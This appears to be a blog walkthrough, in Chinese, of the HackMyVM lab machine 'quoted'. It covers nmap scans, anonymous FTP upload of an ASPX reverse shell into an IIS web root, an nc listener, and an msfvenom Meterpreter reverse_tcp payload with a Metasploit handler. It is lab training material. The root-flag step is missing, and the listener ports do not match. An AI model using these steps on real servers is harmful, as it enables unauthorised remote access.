---
title: HackMyVM-quoted
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# quoted.

> https://hackmyvm.eu/machines/machine.php?vm=quoted
> 

## 信息收集 & 扫描

```c
nmap -sP 192.168.56.0/24                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 07:07 EST
Nmap scan report for 192.168.56.1
Host is up (0.00043s latency).
MAC Address: 0A:00:27:00:00:23 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00036s latency).
MAC Address: 08:00:27:07:F6:1B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.6
Host is up (0.00050s latency).
MAC Address: 08:00:27:61:C2:6F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
```

```c
nmap -sT -min-rate 10000 -p- 192.168.56.6          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 07:14 EST
Warning: 192.168.56.6 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.6
Host is up (0.00034s latency).
Not shown: 64843 closed tcp ports (conn-refused), 680 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:61:C2:6F (Oracle VirtualBox virtual NIC)
```

```c
nmap -sT -sV -O -p 21,80,135,139,445,5357 192.168.56.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 07:15 EST
Nmap scan report for 192.168.56.6
Host is up (0.00050s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
80/tcp   open  http         Microsoft IIS httpd 7.5
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 08:00:27:61:C2:6F (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
```

```c
nmap -script=vuln -p 21,80,135,139,445,5357 192.168.56.6                                                                                                                                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 07:17 EST
Nmap scan report for 192.168.56.6                                                                        
Host is up (0.00056s latency).
                                                                                                         
PORT     STATE SERVICE                                                                                   
21/tcp   open  ftp
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                     
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                                                  
135/tcp  open  msrpc                                                                                     
139/tcp  open  netbios-ssn       
445/tcp  open  microsoft-ds   
5357/tcp open  wsdapi                               
MAC Address: 08:00:27:61:C2:6F (Oracle VirtualBox virtual NIC)                                           
                                                    
Host script results:                               
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED     
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                      
|_smb-vuln-ms10-054: false                         
```

开放`445`，`135`端口可以尝试永恒之蓝，并且开放了`ftp` ，可以尝试使用匿名帐户来看看有没有敏感文件

## 渗透

首先看看ftp存在什么，然后使用`mget`将其全部拉出

```c
ftp 192.168.56.6
Connected to 192.168.56.6.
220 Microsoft FTP Service
Name (192.168.56.6:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
10-05-24  11:16AM       <DIR>          aspnet_client
10-04-24  11:27PM                  689 iisstart.htm
10-04-24  11:27PM               184946 welcome.png
226 Transfer complete.
ftp> mget * 
```

拉下来的文件其中图片打不开，`htm`文件像是`IIS`默认页面

```c
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#B3B3B3;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

实际上访问该靶机`80`端口也是该页面，可能FTP的文件夹就是网站根目录？

![image.png](image%2012.png)

尝试在`FTP`上传文件，意外的也成功了

![image.png](image%2013.png)

这下目标明确了，通过Wappalyzer可以知道使用的是ASP ，我们直接上传`asp`马

> https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
> 

命名为4.aspx并上传

```c
ftp> put 4.aspx
local: 4.aspx remote: 4.aspx
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************| 15971       13.53 MiB/s    --:-- ETA
226 Transfer complete.
15971 bytes sent in 00:00 (5.85 MiB/s)
```

`nc`监听，然后`curl`上传的ASP马,成功反弹回来`shell`

```c
nc -lvp 1234                                            
listening on [any] 1234 ...
192.168.56.6: inverse host lookup failed: Unknown host
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.6] 49160
Spawn Shell...
Microsoft Windows [Srm 6.1.7601]
Telif Hakk (c) 2009 Microsoft Corporation. Tm haklar sakldr.

c:\windows\system32\inetsrv>
```

首先读取用户的`flag`

```c
c:\Users\quoted\Desktop>type user.txt
type user.txt
HMV{User_Flag_Obtained}
```

`HMV{User_Flag_Obtained}`

尝试读取administrator用户`flag`但是提示无权限，因为靶机windows版本较老，我们将会话迁移到msf上

首先创建反弹shell的文件

```c
msfvenom -p windows/meterpreter/reverse_tcp lport=1235 lhost=192.168.56.4 -f exe > shell.exe
```

然后通过`ftp`上传，并且`msf`开启监听

```c
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > set lhost 192.168.56.4
lhost => 192.168.56.4
msf6 exploit(multi/handler) > run
```

执行上传的`exe`文件，这里不知道为什么我的靶机会出现说该程序不是windows程序无法执行😵

root flag

`HMV{Elevated_Shell_Again}`